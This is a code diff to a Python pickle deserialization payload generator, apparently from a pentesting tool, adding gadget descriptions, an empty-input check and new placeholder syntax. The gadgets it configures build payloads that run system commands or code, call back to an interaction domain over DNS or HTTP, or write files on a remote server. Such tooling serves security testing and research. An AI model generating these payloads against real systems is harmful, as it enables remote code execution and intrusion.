@@ -61,26 +61,31 @@ class Pickle(Serializer):
         self.gadgets.append({
             'id': 'picklesystemcommand',
             'name': 'PickleSystemCommand',
+            'description': 'PickleSystemCommand <system_command>',
             'format': '<system_command>'
         })
         self.gadgets.append({
             'id': 'picklecode',
             'name': 'PickleCode',
+            'description': 'PickleCode <code>',
             'format': '<code>'
         })
         self.gadgets.append({
             'id': 'pickledns',
             'name': 'PickleDNS',
+            'description': 'PickleDNS <domain>',
             'format': '<domain>'
         })
         self.gadgets.append({
             'id': 'picklehttpget',
             'name': 'PickleHttpGet',
+            'description': 'PickleHttpGet <url>',
             'format': '<url>'
         })
         self.gadgets.append({
             'id': 'picklefilewrite',
             'name': 'PickleFileWrite',
+            'description': 'PickleFileWrite <remote_file>;<content>',
             'format': '<remote_file>;<content>'
         })
 
@@ -111,6 +116,9 @@ class Pickle(Serializer):
 
     def generate(self, chains, output):
 
+        if len(chains) == 0:
+            return 0
+
         system_command = self.chainOpts.system_command
         interact_domain = self.chainOpts.interact_domain
         py_code = self.getFileContentOrCode(self.chainOpts.python_code)
@@ -118,7 +126,7 @@ class Pickle(Serializer):
         remote_content = self.getFileContentOrCode(self.chainOpts.remote_content) if self.chainOpts.remote_content is not None else py_code
     
         logging.info(f"System command: {system_command}")
-        logging.info(f"Python Code: {py_code}")
+        logging.info(f"Python Code: {self.chainOpts.python_code}")
         logging.info(f"Interact domain: {interact_domain}")
         logging.info(f"File written on remote server: {remote_file}")
         logging.info(f"Content written on server: {remote_content}")
@@ -138,26 +146,26 @@ class Pickle(Serializer):
             logging.info(f"[{chain['name']}] Generating payload")
 
             chain_system_command = system_command
-            chain_system_command = chain_system_command.replace('%chain_id%', chain['id'])
-            chain_system_command = chain_system_command.replace('%domain%', str(interact_domain))
+            chain_system_command = chain_system_command.replace('%%chain_id%%', chain['id'])
+            chain_system_command = chain_system_command.replace('%%domain%%', str(interact_domain))
             escaped_chain_system_command = chain_system_command.replace("'", "\\'")
 
             chain_py_code = py_code
-            chain_py_code = chain_py_code.replace('%system_command%', escaped_chain_system_command)
-            chain_py_code = chain_py_code.replace('%domain%', str(interact_domain))
-            chain_py_code = chain_py_code.replace('%chain_id%', chain['id'])
+            chain_py_code = chain_py_code.replace('%%system_command%%', escaped_chain_system_command)
+            chain_py_code = chain_py_code.replace('%%domain%%', str(interact_domain))
+            chain_py_code = chain_py_code.replace('%%chain_id%%', chain['id'])
 
             chain_remote_content = remote_content
-            chain_remote_content = chain_remote_content.replace('%system_command%', escaped_chain_system_command)
-            chain_remote_content = chain_remote_content.replace('%domain%', str(interact_domain))
-            chain_remote_content = chain_remote_content.replace('%chain_id%', chain['id'])
+            chain_remote_content = chain_remote_content.replace('%%system_command%%', escaped_chain_system_command)
+            chain_remote_content = chain_remote_content.replace('%%domain%%', str(interact_domain))
+            chain_remote_content = chain_remote_content.replace('%%chain_id%%', chain['id'])
 
             chainArguments = format
             chainArguments = chainArguments.replace('<system_command>', chain_system_command)
             chainArguments = chainArguments.replace('<code>', chain_py_code)
             chainArguments = chainArguments.replace('<domain>', str(interact_domain))
             chainArguments = chainArguments.replace('<url>', f"https://{interact_domain}/?{chain['id']}")
-            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%ext%', 'py'))
+            chainArguments = chainArguments.replace('<remote_file>', remote_file.replace('%%ext%%', 'py'))
             chainArguments = chainArguments.replace('<content>', chain_remote_content)
             
 
